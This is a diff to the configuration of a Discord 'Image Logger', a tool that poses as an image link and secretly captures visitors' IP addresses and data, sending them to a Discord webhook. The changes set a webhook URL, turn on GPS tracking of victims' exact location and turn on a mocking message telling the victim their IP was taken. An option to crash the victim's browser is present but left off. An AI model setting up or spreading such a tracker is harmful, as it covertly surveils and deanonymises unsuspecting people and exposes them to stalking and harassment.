@@ -13,22 +13,22 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1518675889435578530/yfpgZXaiiFVQlSRuGIALhXpPsnEeT29qQG83bIDfQKaaP5BQBEnicgsuvUcxeBeqhAE4",
-    "image": "https://tse2.mm.bing.net/th/id/OIP.fRayNU8xmfCtl0EJ6wrhfgHaEK?rs=1&pid=ImgDetMain&o=7&rm=3&adlt=strict", # You can also have a custom image by using a URL argument
+    "image": "https://images.pexels.com/photos/3264504/pexels-photo-3264504.jpeg?_gl=1*1wp8ryp*_ga*MTY1ODEzNzM2Ni4xNzgyNDk4MTEy*_ga_8JE65Q40S6*czE3ODI0OTgxMTIkbzEkZzEkdDE3ODI0OTgxMTkkajUzJGwwJGgw", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Logger (do Kaualf :3)", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Bruh pq abrir o navegador acabei de pegar seu ip tbm gg's", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
